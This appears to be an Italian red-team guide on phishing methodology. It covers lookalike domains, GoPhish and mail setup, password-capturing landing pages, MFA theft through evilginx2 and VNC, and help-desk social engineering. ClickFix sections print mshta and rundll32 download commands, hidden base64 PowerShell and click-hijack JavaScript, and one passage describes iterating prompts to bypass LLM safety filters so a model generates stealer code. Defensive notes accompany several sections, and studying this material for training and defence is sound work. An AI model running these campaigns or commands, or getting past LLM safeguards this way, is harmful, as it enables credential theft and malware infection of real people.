# Metodologia di phishing

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Effettuare la ricognizione della vittima
   1. Selezionare il **dominio della vittima**.
   2. Eseguire una semplice enumerazione web **cercando i portali di login** usati dalla vittima e **decidere** quale **impersonare**.
   3. Usare tecniche di **OSINT** per **trovare indirizzi email**.
2. Preparare l'ambiente
   1. **Acquistare il dominio** da usare per la valutazione di phishing
   2. **Configurare i record** relativi al servizio email (SPF, DMARC, DKIM, rDNS)
   3. Configurare il VPS con **gophish**
3. Preparare la campagna
   1. Preparare il **modello email**
   2. Preparare la **pagina web** per rubare le credenziali
4. Lanciare la campagna!

## Generare nomi di dominio simili o acquistare un dominio affidabile

### Tecniche di variazione dei nomi di dominio

- **Keyword**: il nome di dominio **contiene** una **parola chiave** importante del dominio originale (ad es., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Sottodominio con trattino**: sostituire il **punto con un trattino** in un sottodominio (ad es., www-zelster.com).
- **Nuovo TLD**: stesso dominio con un **nuovo TLD** (ad es., zelster.org)
- **Homoglyph**: **sostituisce** una lettera nel nome di dominio con **lettere dall'aspetto simile** (ad es., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Trasposizione:** **scambia due lettere** all'interno del nome di dominio (ad es., zelsetr.com).
- **Singolarizzazione/Pluralizzazione**: aggiunge o rimuove una “s” alla fine del nome di dominio (ad es., zeltsers.com).
- **Omissione**: **rimuove una** delle lettere dal nome di dominio (ad es., zelser.com).
- **Ripetizione:** **ripete una** delle lettere nel nome di dominio (ad es., zeltsser.com).
- **Sostituzione**: simile a Homoglyph, ma meno furtiva. Sostituisce una delle lettere nel nome di dominio, magari con una lettera vicina a quella originale sulla tastiera (ad es., zektser.com).
- **Inserimento di un sottodominio**: inserisce un **punto** all'interno del nome di dominio (ad es., ze.lster.com).
- **Inserimento**: **inserisce una lettera** nel nome di dominio (ad es., zerltser.com).
- **Punto mancante**: aggiunge il TLD al nome di dominio. (ad es., zelstercom.com)

**Strumenti automatici**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Siti web**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

È **possibile che alcuni bit archiviati o in comunicazione vengano invertiti automaticamente** a causa di vari fattori, come brillamenti solari, raggi cosmici o errori hardware.

Quando questo concetto viene **applicato alle richieste DNS**, è possibile che il **dominio ricevuto dal server DNS** non corrisponda a quello richiesto inizialmente.

Ad esempio, la modifica di un singolo bit nel dominio "windows.com" può trasformarlo in "windnws.com."

Gli aggressori possono **approfittarne registrando più domini soggetti a bit-flipping** simili al dominio della vittima. Il loro intento è reindirizzare gli utenti legittimi alla propria infrastruttura.

Per ulteriori informazioni, leggi [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Acquistare un dominio affidabile

Puoi cercare un dominio scaduto da usare su [https://www.expireddomains.net/](https://www.expireddomains.net).\
Per assicurarti che il dominio scaduto che intendi acquistare **abbia già un buon SEO**, puoi verificare come è categorizzato su:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Individuare gli indirizzi email

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratuito)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratuito)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Per **individuare altri** indirizzi email validi o **verificare quelli** che hai già trovato, puoi controllare se è possibile forzarli con brute force sui server SMTP della vittima. [Scopri qui come verificare/individuare gli indirizzi email](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Inoltre, non dimenticare che se gli utenti usano **un portale web per accedere alle proprie email**, puoi verificare se è vulnerabile al **brute force degli username** e, se possibile, sfruttare la vulnerabilità.

## Configurare GoPhish

### Installazione

Puoi scaricarlo da [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Scaricalo ed estrailo in `/opt/gophish`, quindi esegui `/opt/gophish/gophish`\
Nell'output verrà mostrata una password per l'utente admin sulla porta 3333. Accedi quindi a quella porta e usa le credenziali per modificare la password admin. Potrebbe essere necessario creare un tunnel verso la porta locale:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Configurazione

**Configurazione del certificato TLS**

Prima di questo passaggio dovresti **aver già acquistato il dominio** che intendi usare e questo deve **puntare** all'**IP del VPS** su cui stai configurando **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Configurazione della posta**

Avvia l'installazione: `apt-get install postfix`

Aggiungi quindi il dominio ai seguenti file:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifica anche i valori delle seguenti variabili in /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Infine, modifica i file **`/etc/hostname`** e **`/etc/mailname`** inserendo il nome del tuo dominio e **riavvia il VPS.**

Ora crea un **record DNS A** per `mail.<domain>` che punti all'**indirizzo IP** del VPS e un **record DNS MX** che punti a `mail.<domain>`.

Ora proviamo a inviare un'email:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Configurazione di Gophish**

Interrompi l'esecuzione di Gophish e configuriamolo.\
Modifica `/opt/gophish/config.json` come segue (nota l'uso di https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Configura il servizio gophish**

Per creare il servizio gophish in modo che possa essere avviato automaticamente e gestito come un servizio, puoi creare il file `/etc/init.d/gophish` con il seguente contenuto:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Completa la configurazione del servizio e verifica che funzioni eseguendo:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Configurare il mail server e il dominio

### Aspetta e sii legittimo

Più un dominio è vecchio, meno è probabile che venga rilevato come spam. Dovresti quindi aspettare il più a lungo possibile (almeno 1 settimana) prima del phishing assessment. Inoltre, se pubblichi una pagina relativa a un settore con una buona reputazione, la reputazione ottenuta sarà migliore.

Nota che, anche se devi aspettare una settimana, puoi completare subito tutte le configurazioni.

### Configurare il record Reverse DNS (rDNS)

Imposta un record rDNS (PTR) che risolva l'indirizzo IP del VPS nel nome di dominio.

### Record Sender Policy Framework (SPF)

Devi **configurare un record SPF per il nuovo dominio**. Se non sai cos'è un record SPF, [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puoi usare [https://www.spfwizard.net/](https://www.spfwizard.net) per generare la tua policy SPF (usa l'IP del VPS)

![Modulo SPF Wizard per generare un record SPF per un dominio di phishing](<../../images/image (1037).png>)

Questo è il contenuto da impostare in un record TXT nel dominio:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Record DMARC (Domain-based Message Authentication, Reporting & Conformance)

Devi **configurare un record DMARC per il nuovo dominio**. Se non sai cos'è un record DMARC, [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Devi creare un nuovo record DNS TXT per l'hostname `_dmarc.<domain>` con il seguente contenuto:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Devi **configurare un DKIM per il nuovo dominio**. Se non sai cos'è un record DKIM, [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Questo tutorial si basa su: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Devi concatenare entrambi i valori B64 generati dalla chiave DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Verifica il punteggio della configurazione email

Puoi farlo usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Ti basta accedere alla pagina e inviare un'email all'indirizzo che ti viene fornito:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Puoi anche **controllare la configurazione della tua email** inviando un'email a `check-auth@verifier.port25.com` e **leggendo la risposta** (per farlo dovrai **aprire** la porta **25** e controllare la risposta nel file _/var/mail/root_ se invii l'email come root).\
Verifica di superare tutti i test:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Potresti anche inviare un **messaggio a un account Gmail sotto il tuo controllo** e controllare le **intestazioni dell'email** nella tua casella di posta Gmail: `dkim=pass` dovrebbe essere presente nel campo dell'intestazione `Authentication-Results`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Rimozione dalla blacklist di Spamhouse

La pagina [www.mail-tester.com](https://www.mail-tester.com) può indicarti se il tuo dominio è bloccato da Spamhouse. Puoi richiedere la rimozione del tuo dominio/IP all'indirizzo: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Rimozione dalla blacklist di Microsoft

​​Puoi richiedere la rimozione del tuo dominio/IP all'indirizzo [https://sender.office.com/](https://sender.office.com).

## Creazione e avvio di una campagna GoPhish

### Profilo di invio

- Imposta un **nome identificativo** per il profilo del mittente
- Decidi da quale account inviare le email di phishing. Suggerimenti: _noreply, support, servicedesk, salesforce..._
- Puoi lasciare vuoti il nome utente e la password, ma assicurati di selezionare Ignora errori del certificato

![Creazione e avvio di una campagna GoPhish - Profilo di invio: puoi lasciare vuoti il nome utente e la password, ma assicurati di selezionare Ignora errori del certificato](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Si consiglia di usare la funzionalità "**Invia email di prova**" per verificare che tutto funzioni.\
> Consiglio di **inviare le email di prova a indirizzi 10min mail** per evitare di finire in blacklist durante i test.

### Modello email

- Imposta un **nome identificativo** per il modello
- Poi scrivi un **oggetto** (niente di strano, solo qualcosa che ti aspetteresti di leggere in una normale email)
- Assicurati di aver selezionato "**Aggiungi immagine di tracciamento**"
- Scrivi il **modello dell'email** (puoi usare variabili come nell'esempio seguente):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Nota che **per aumentare la credibilità dell’email**, è consigliabile usare una firma presa da un’email del cliente. Suggerimenti:

- Invia un’email a un **indirizzo inesistente** e controlla se la risposta contiene una firma.
- Cerca **indirizzi email pubblici**, come info@ex.com, press@ex.com o public@ex.com, e invia loro un’email, poi attendi una risposta.
- Prova a contattare un indirizzo email **valido individuato** e attendi una risposta.

![Profilo di invio - Modello email: prova a contattare un indirizzo email valido individuato e attendi una risposta](<../../images/image (80).png>)

> [!TIP]
> Il modello email permette anche di **allegare file da inviare**. Se vuoi anche sottrarre challenge NTLM usando file o documenti appositamente predisposti, [leggi questa pagina](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Pagina di destinazione

- Inserisci un **nome**
- **Scrivi il codice HTML** della pagina web. Nota che puoi **importare** pagine web.
- Seleziona **Capture Submitted Data** e **Capture Passwords**
- Imposta un **reindirizzamento**

![Modello email - Pagina di destinazione: seleziona Capture Submitted Data e Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Di solito dovrai modificare il codice HTML della pagina e fare qualche test in locale (magari usando un server Apache) **finché non ottieni il risultato desiderato.** Poi, inserisci quel codice HTML nel campo.\
> Nota che, se devi **usare risorse statiche** per l’HTML (magari pagine CSS e JS), puoi salvarle in _**/opt/gophish/static/endpoint**_ e poi accedervi da _**/static/\<filename>**_

> [!TIP]
> Per il reindirizzamento puoi **reindirizzare gli utenti alla pagina web principale legittima** della vittima, oppure reindirizzarli, ad esempio, a _/static/migration.html_, mostrare una **ruota di caricamento (**[**https://loading.io/**](https://loading.io)**) per 5 secondi e poi indicare che il processo è andato a buon fine**.

### Utenti e gruppi

- Imposta un nome
- **Importa i dati** (nota che, per usare il modello dell’esempio, ti servono il nome, il cognome e l’indirizzo email di ogni utente)

![Pagina di destinazione - Utenti e gruppi: importa i dati (nota che, per usare il modello dell’esempio, ti servono il nome, il cognome e l’indirizzo email di ogni utente)](<../../images/image (163).png>)

### Campagna

Infine, crea una campagna selezionando un nome, il modello email, la pagina di destinazione, l’URL, il profilo di invio e il gruppo. Nota che l’URL sarà il link inviato alle vittime.

Nota che il **profilo di invio permette di inviare un’email di prova per vedere come apparirà l’email di phishing finale**:

![Utenti e gruppi - Campagna: nota che il profilo di invio permette di inviare un’email di prova per vedere come apparirà l’email di phishing finale](<../../images/image (192).png>)

Quando è tutto pronto, avvia la campagna!

## Clonazione di siti web

Se per qualche motivo vuoi clonare il sito web, consulta la pagina seguente:


{{#ref}}
clone-a-website.md
{{#endref}}

## Documenti e file backdoor

In alcune attività di phishing (principalmente per i Red Team) potresti voler **inviare anche file contenenti una backdoor** (magari un C2 o semplicemente qualcosa che attivi un’autenticazione).\
Consulta la pagina seguente per alcuni esempi:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Tramite proxy MitM

L’attacco precedente è piuttosto ingegnoso, perché simuli un sito web reale e raccogli le informazioni inserite dall’utente. Purtroppo, se l’utente non inserisce la password corretta o se l’applicazione che hai simulato è configurata con 2FA, **queste informazioni non ti permetteranno di impersonare l’utente ingannato**.

È qui che strumenti come [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena) si rivelano utili. Questo strumento permette di eseguire un attacco simile a un MitM. In sostanza, l’attacco funziona nel modo seguente:

1. **Impersoni il modulo di login** della pagina web reale.
2. L’utente **invia** le proprie **credenziali** alla tua pagina falsa e lo strumento le invia alla pagina web reale, **verificando che funzionino**.
3. Se l’account è configurato con **2FA**, la pagina MitM la richiederà e, quando l’**utente la inserisce**, lo strumento la invierà alla pagina web reale.
4. Una volta autenticato l’utente, tu (come attaccante) avrai **acquisito le credenziali, la 2FA, il cookie e qualsiasi informazione** relativa a ogni interazione avvenuta mentre lo strumento esegue un MitM.

### Tramite VNC

E se invece di **indirizzare la vittima a una pagina malevola** simile all’originale, la indirizzassi a una **sessione VNC con un browser connesso alla pagina web reale**? Potresti vedere cosa fa, sottrarre la password, l’MFA usata, i cookie...\
Puoi farlo con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Rilevare se si è stati individuati

Ovviamente, uno dei modi migliori per capire se si è stati scoperti è **cercare il proprio dominio nelle blacklist**. Se compare nell’elenco, significa che in qualche modo il dominio è stato rilevato come sospetto.\
Un modo semplice per controllare se il tuo dominio compare in una blacklist è usare [https://malwareworld.com/](https://malwareworld.com)

Tuttavia, esistono altri modi per capire se la vittima **sta cercando attivamente attività di phishing sospette** in circolazione, come spiegato in:


{{#ref}}
detecting-phising.md
{{#endref}}

Puoi **acquistare un dominio con un nome molto simile** a quello del dominio della vittima **e/o generare un certificato** per un **sottodominio** di un dominio sotto il tuo controllo, **contenente** la **parola chiave** del dominio della vittima. Se la **vittima** esegue qualsiasi tipo di **interazione DNS o HTTP** con questi domini, saprai che **sta cercando attivamente** domini sospetti e dovrai agire con molta discrezione.<sup>[[2]](#references)</sup>

### Valutare il phishing

Usa [**Phishious** ](https://github.com/Rices/Phishious)per valutare se la tua email finirà nella cartella spam, verrà bloccata oppure andrà a buon fine.

## Compromissione dell’identità con interazione diretta (reimpostazione MFA tramite help desk)

I moderni gruppi di intrusione evitano sempre più spesso del tutto le esche via email e **prendono direttamente di mira il flusso di lavoro del service desk/recupero dell’identità** per aggirare l’MFA. L’attacco è interamente basato sul principio "living-off-the-land": una volta ottenute credenziali valide, l’operatore si sposta usando gli strumenti di amministrazione integrati: non serve malware.<sup>[[6]](#references)</sup>

### Flusso dell’attacco
1. Ricognizione della vittima 
   * Raccogliere dettagli personali e aziendali da LinkedIn, violazioni di dati, GitHub pubblico, ecc.  
   * Individuare le identità di alto valore (dirigenti, IT, finanza) e ricostruire l’**esatta procedura dell’help desk** per la reimpostazione della password/MFA.
2. Social engineering in tempo reale  
   * Telefonare, contattare su Teams o chattare con l’help desk fingendosi la persona presa di mira (spesso usando un **ID chiamante falsificato** o una **voce clonata**).  
   * Fornire le informazioni personali raccolte in precedenza per superare la verifica basata su domande di sicurezza.  
   * Convincere l’operatore a **reimpostare il segreto MFA** o a eseguire uno **SIM swap** su un numero di cellulare registrato.
3. Azioni immediate dopo l’accesso (≤60 min nei casi reali)  
   * Stabilire un punto d’appoggio tramite un qualsiasi portale web SSO.  
   * Enumerare AD/AzureAD usando gli strumenti integrati (senza depositare binari):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Movimento laterale con **WMI**, **PsExec** o agenti **RMM** legittimi già inseriti nella whitelist dell'ambiente.

### Rilevamento e mitigazione
* Trattare il recupero dell'identità tramite help desk come un'**operazione privilegiata**: richiedere step-up auth e l'approvazione di un manager.
* Distribuire regole di **Identity Threat Detection & Response (ITDR)** / **UEBA** che generino un avviso in caso di:  
  * Modifica del metodo MFA + autenticazione da un nuovo dispositivo / area geografica.  
  * Elevazione immediata dello stesso principal (user-→-admin).
* Registrare le chiamate all'help desk e richiedere una **richiamata a un numero già registrato** prima di qualsiasi reimpostazione.
* Implementare **Just-In-Time (JIT) / Privileged Access**, in modo che gli account appena reimpostati **non ereditino automaticamente token con privilegi elevati**.

---

## Inganno su larga scala – SEO Poisoning e campagne “ClickFix”
I gruppi criminali comuni compensano i costi delle operazioni ad alto coinvolgimento con attacchi di massa che trasformano **motori di ricerca e reti pubblicitarie nel canale di distribuzione**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** spinge un risultato falso come `chromium-update[.]site` in cima agli annunci di ricerca.
2. La vittima scarica un piccolo **loader di prima fase** (spesso JS/HTA/ISO). Esempi osservati da Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Il loader esfiltra i cookie del browser e i database delle credenziali, quindi scarica un **loader silenzioso** che decide – *in tempo reale* – se distribuire:
   * RAT (ad es. AsyncRAT, RustDesk)
   * ransomware / wiper
   * componente di persistenza (chiave Run del registro + attività pianificata)

### Suggerimenti per il rafforzamento
* Bloccare i domini registrati di recente e applicare **Advanced DNS / URL Filtering** anche agli *annunci di ricerca*, oltre che alle e-mail.
* Limitare l'installazione del software a pacchetti MSI firmati / Store e impedire l'esecuzione di `HTA`, `ISO`, `VBS` tramite policy.
* Monitorare i processi figli dei browser che aprono programmi di installazione:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Cerca LOLBins spesso abusati dai loader di primo stadio (ad es. `regsvr32`, `curl`, `mshta`).

### Dirottamento del clic sul pulsante di download con passaggio a TDS
Alcuni portali software fasulli mantengono l’`href` visibile del download impostato sull’URL **reale** di GitHub/release, ma dirottano la **prima** interazione dell’utente tramite JavaScript e indirizzano la vittima verso una catena **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Caratteristiche principali:
- L’hook viene solitamente eseguito nella **capture phase** (`true`) su `document`, quindi si attiva prima degli handler del sito.
- Chrome spesso usa `mousedown` invece di `click` per mantenere il redirect associato a un **user gesture** valido e migliorare il bypass del popup blocker.
- Alcune varianti aprono in anticipo `about:blank` o simulano click su `<a target="_blank">`, assegnando l’URL TDS solo in un secondo momento.
- I limiti lato browser sono spesso salvati in `localStorage`, quindi il **primo click** può raggiungere il malware, mentre refresh e nuovi tentativi rimandano al link visibile dall’aspetto innocuo.
- Il TDS può filtrare in base a referrer, dominio di ingresso, GEO, fingerprint del browser/dispositivo, controlli VPN/datacenter, contesto del click e contatori per sessione, rendendo non deterministici i replay degli analisti.

Idee per i defender:
- Confrontare l’`href` **visualizzato** con la destinazione di navigazione **effettiva** generata al momento del click.
- Cercare handler `document.addEventListener(..., true)` che chiamano sia `preventDefault()` sia `stopImmediatePropagation()` insieme a `window.open`, `about:blank` o click simulati su anchor.
- Considerare gli insiemi di domini di download software appena registrati, che caricano tutti lo stesso stage CloudFront/JS, un pattern ad alto segnale di SEO poisoning/TDS.

### ClickFix da pagine di verifica false + fetch di LOLBAS dall’aspetto di archivi
Alcuni rami del TDS terminano con una pagina di verifica falsa (in stile Cloudflare/IUAM) che invita la vittima a eseguire un binario Windows attendibile, ad esempio:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Note:
- `mshta.exe` esegue l'**HTA/VBScript all'inizio della risposta**, anche se l'URL finge di puntare a un archivio `.7z`; i dati d'archivio aggiunti in coda possono essere un semplice diversivo.
- Gli stadi successivi spesso continuano a mentire sul tipo di file (`.rtf` per PowerShell, `.asar` per Python, ZIP con binari imbottiti), per poi passare al **manual PE mapping / in-memory execution**.
- Se stai rispondendo a una di queste catene, conserva **rete + memoria dal primo avvio riuscito**: le riproduzioni successive potrebbero mostrare solo un percorso innocuo di installer/SFX o fallire perché il rilascio del payload/della chiave era legato alla sessione TDS originale.

### Tecniche di distribuzione DLL ClickFix (falso aggiornamento CERT)
* Esca: avviso CERT nazionale clonato con un pulsante **Update** che mostra istruzioni dettagliate per la “correzione”. Alle vittime viene detto di eseguire un batch che scarica una DLL e la esegue tramite `rundll32`.<sup>[[12]](#references)</sup>
* Catena batch tipica osservata:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` salva il payload in `%TEMP%`, un breve sleep maschera il jitter di rete, quindi `rundll32` chiama l’entrypoint esportato (`notepad`).
* La DLL invia l’identità dell’host e interroga il C2 ogni pochi minuti. Le istruzioni remote arrivano come **PowerShell codificato in base64**, eseguito in modalità nascosta e con bypass dei criteri:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Questo mantiene la flessibilità del C2 (il server può cambiare le attività senza aggiornare la DLL) e nasconde le finestre della console. Cercate processi PowerShell figli di `rundll32.exe` che combinano `-WindowStyle Hidden`, `FromBase64String` e `Invoke-Expression`.
* I difensori possono cercare callback HTTP(S) del tipo `...page.php?tynor=<COMPUTER>sss<USER>` e intervalli di polling di 5 minuti dopo il caricamento della DLL.

---

## Malvertising attivato dalla visualizzazione tramite RTB

A differenza di un risultato di ricerca sponsorizzato, che richiede un clic, un annuncio RTB può caricare JavaScript di terze parti quando la sua creatività viene visualizzata su un sito web o un'app. Citizen Lab ha osservato tag pubblicitari che chiamavano un server decisionale separato con identificatori pubblicitari. La maggior parte delle impression ha ricevuto una risposta vuota; alcune impression selezionate potevano ricevere JavaScript. Una risposta innocua durante la riproduzione non dimostra quindi che tutti gli utenti abbiano ricevuto lo stesso contenuto.<sup>[[14]](#references)</sup>

Questo è un **meccanismo di distribuzione**, non un exploit di per sé: l'esecuzione di JavaScript in un contesto di rendering degli annunci non installa automaticamente spyware. L'exploit sottostante del browser o del sistema operativo non è stato divulgato, quindi la sola visualizzazione di un annuncio o una richiesta al server decisionale non dimostra un'infezione. Per il collegamento degli identificatori nel targeting RTB, vedere [Threat Modeling and Identity Separation](../../privacy/threat-modeling-and-identity-separation.md).<sup>[[14]](#references)</sup>

## Operazioni di phishing potenziate dall'AI
Gli attaccanti ora combinano **API LLM e di clonazione vocale** per esche completamente personalizzate e interazioni in tempo reale.

| Livello | Esempio di utilizzo da parte dell'attore della minaccia |
|-------|-----------------------------|
|Automazione|Generare e inviare oltre 100.000 email / SMS con formulazioni variabili e link di tracciamento.|
|AI generativa|Creare email *una tantum* che citano operazioni pubbliche di M&A e battute interne tratte dai social media; usare la voce deepfake del CEO in una truffa con callback.|
|AI agentica|Registrare autonomamente domini, raccogliere informazioni open-source e preparare email successive quando una vittima fa clic ma non invia le credenziali.|

**Difesa:**  
• Aggiungere **banner dinamici** che evidenzino i messaggi inviati tramite automazioni non attendibili (in presenza di anomalie ARC/DKIM).  
• Implementare **frasi di verifica biometriche vocali** per le richieste telefoniche ad alto rischio.  
• Simulare continuamente esche generate dall'AI nei programmi di sensibilizzazione: i modelli statici sono obsoleti.

Vedere anche: abuso della navigazione agentica per il phishing delle credenziali:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Vedere anche: abuso da parte degli agenti AI degli strumenti CLI locali e di MCP (per l'inventario dei segreti e il rilevamento):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Assemblaggio a runtime di JavaScript di phishing assistito da LLM (generazione di codice nel browser)

Gli attaccanti possono distribuire HTML dall'aspetto innocuo e **generare lo stealer a runtime** chiedendo JavaScript a un'**API LLM attendibile**, quindi eseguendolo nel browser (ad es. con `eval` o un `<script>` dinamico).<sup>[[8]](#references)</sup>

1. **Prompt come offuscamento:** codificare URL di esfiltrazione/stringhe Base64 nel prompt; iterare sulla formulazione per aggirare i filtri di sicurezza e ridurre le allucinazioni.
2. **Chiamata API lato client:** al caricamento, JS chiama un LLM pubblico (Gemini/DeepSeek/ecc.) o un proxy CDN; nell'HTML statico sono presenti solo il prompt e la chiamata API.
